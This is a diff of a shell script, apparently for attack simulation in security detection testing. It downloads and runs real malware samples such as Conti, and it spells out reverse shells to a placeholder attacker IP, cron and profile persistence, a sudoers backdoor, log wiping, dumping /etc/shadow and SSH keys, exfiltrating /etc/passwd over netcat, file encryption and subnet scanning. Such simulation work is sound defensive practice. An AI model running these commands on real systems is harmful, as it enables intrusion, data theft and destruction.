@@ -2,13 +2,14 @@
 # Configured for a Busybox/Alpine container by hreed@paloaltonetworks.com
 # This script simulates various malicious activities for detection and response testing.
 
+# CONTAINER UPDATE 
 # Update Alpine package manager
 apk update
 apk upgrade
 # Network scanning tools
 echo "[+] Adding Network Scanning Tools" 
 apk add nmap tor socat
-
+apk add curl
 # Script execution environments
 echo "[+] Adding script execution environments"
 apk add busybox-extras bash python3 py3-pip
@@ -37,6 +38,7 @@ wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.
 sleep 3 
 
 # SCENARIO 2 --- Local Malware 
+# Outcome: download and prompt local malware analysis 
 echo "Scenario 2 - Malware Protection - Wildfire Analysis"
 
 echo "[+] Downloading Unix backdoor script"
@@ -52,9 +54,6 @@ echo "[+] Creating more shadow copies"
 cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /bin/nonsus.sh
 chmod +x /bin/nonsus.sh
 sleep 3 
-
-echo "[+] Making Unix backdoor executable"
-# Already done above with chmod
 
 echo "[+] Downloading Conti-C2 malware"
 wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O conti.sh
@@ -72,112 +71,8 @@ echo "[+] Changing C2 Client file permissions to executable"
 chmod +x c2.sh
 sleep 3
 
-## raonsomeware senario 
-git clone https://github.com/jimmy-ly00/Ransomware-PoC
-cd /Ransomware-POC 
-pip3 install pycroptodome 
-Encrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -e
-Decrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -d
 
-
-# MITRE ATT&CK TTP Demonstration Script
-# === Initial Access and Execution ===
-echo "[*] Attempting SSH Access..."
-ssh user@localhost || echo "[!] SSH failed - Continuing..."
-
-echo "[*] Creating reverse shell..."
-bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1 || echo "[!] Reverse shell failed - Continuing..."
-
-# === Persistence ===
-echo "[*] Adding a cron job for persistence..."
-echo "* * * * * root /bin/sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1" >> /etc/crontabs/root
-
-echo "[*] Adding a malicious script to .profile..."
-echo "/bin/sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1" >> ~/.profile
-
-# === Privilege Escalation ===
-echo "[*] Modifying sudoers file for privilege escalation..."
-echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
-
-echo "[*] Switching to root user..."
-sudo su - || echo "[!] Failed to switch to root - Continuing..."
-
-# === Defense Evasion ===
-echo "[*] Removing log files..."
-rm -rf /var/log/*
-
-echo "[*] Changing permissions for /etc/shadow to hide from non-root users..."
-chmod 600 /etc/shadow
-
-# === Credential Access ===
-echo "[*] Dumping /etc/shadow for credential access..."
-cat /etc/shadow || echo "[!] Failed to read /etc/shadow - Continuing..."
-
-echo "[*] Extracting saved credentials from .bash_history..."
-cat ~/.bash_history | grep password
-
-# === Discovery ===
-echo "[*] Gathering system information..."
-uname -a
-
-echo "[*] Checking network interfaces..."
-ifconfig -a
-
-echo "[*] Listing running processes..."
-ps aux
-
-echo "[*] Listing contents of critical directories..."
-ls -alh /etc
-
-# === Lateral Movement ===
-echo "[*] Attempting SSH to target machine..."
-ssh user@target-machine || echo "[!] SSH to target failed - Continuing..."
-
-# === Collection ===
-echo "[*] Reading SSH keys..."
-cat ~/.ssh/id_rsa
-
-echo "[*] Archiving files for exfiltration..."
-tar -czvf collected_data.tar.gz /etc /home
-
-echo "[*] Creating reverse shell using netcat..."
-nc -e /bin/sh [ATTACKER_IP] [PORT]
-
-# === Exfiltration ===
-echo "[*] Exfiltrating /etc/passwd..."
-cat /etc/passwd | nc [ATTACKER_IP] [PORT]
-
-# === Impact ===
-echo "[*] Disabling SSH service..."
-service sshd stop || echo "[!] Failed to stop SSH service - Continuing..."
-
-echo "[*] Encrypting sensitive data..."
-tar -cf sensitive_data.tar /important_dir && openssl enc -aes-256-cbc -salt -in sensitive_data.tar -out sensitive_data.tar.enc -k [PASSWORD]
-
-
-## MASSCAN 
-git clone https://github.com/robertdavidgraham/masscan.git
-cd masscan
-make
-
-## RANSOMWARE POC 
-echo "[+] Cloning Ransomware-PoC"
-git clone https://github.com/jimmy-ly00/Ransomware-PoC
-cd Ransomware-PoC 
-pip3 install pycryptodome
-# Instructions for usage (not executed):
-# Encrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -e
-# Decrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -d
-cd ..
-
-## MASSCAN 
-echo "[+] Downloading and building masscan"
-git clone https://github.com/robertdavidgraham/masscan.git
-cd masscan
-make
-cd ..
-
-# MITRE ATT&CK TTP Demonstration Script
+# SCENARIO  3 --- MITRE ATT&CK TTP Demonstration Script
 # === Initial Access and Execution ===
 echo "[*] Attempting SSH Access..."
 ssh user@localhost || echo "[!] SSH failed - Continuing..."
@@ -260,22 +155,15 @@ chmod +x deepce.sh
 ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepcechmod +x deepce.sh
 
 
-# Senario 5 - Scanning and Discovery on network 
-### Network Scanning Local 
-echo "[+] Starting local scanning process"
-nmap -p- 10.0.0.0/16 > localhost.txt
-
-### Network Scanning with address list 
-echo "[+] Downloading hosts list and scanning"
-wget -O url2.txt https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv
-nmap -iL url2.txt
-
-# Execution of Malware (suppress errors with `|| true`)
 echo "[+] Calling malware executables"
-#[TODO] Error handeling in this - nil pointer reference in go library 
+#[TODO] Error handeling in this - nil pointer reference in go library # Execution of Malware (suppress errors with `|| true`)
 #./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
 sh conti.sh || true 
 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 #./c2.sh || true 
 
 
+# Senario 5 - Scanning and Discovery on network 
+### Network Scanning Local 
+echo "[+] Starting local scanning process"
+nmap -p- 10.0.0.0/16 > localhost.txt
